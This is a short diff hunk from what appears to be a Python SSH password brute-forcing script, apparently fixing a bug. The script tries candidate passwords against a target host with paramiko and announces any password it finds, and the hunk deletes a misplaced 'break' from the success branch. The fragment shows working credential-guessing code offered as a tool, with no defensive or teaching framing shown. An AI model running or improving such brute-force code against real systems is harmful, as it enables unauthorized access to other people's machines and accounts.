@@ -168,7 +168,6 @@ while True:
             try:
                 ssh.connect(target_ip, port=22, username=username, password=password, timeout=3)
                 print(f"\n[+] SUCCESS! Password Found: {password}")
-                break
                 ssh.close()
                 return True
             except (socket.error, paramiko.SSHException):
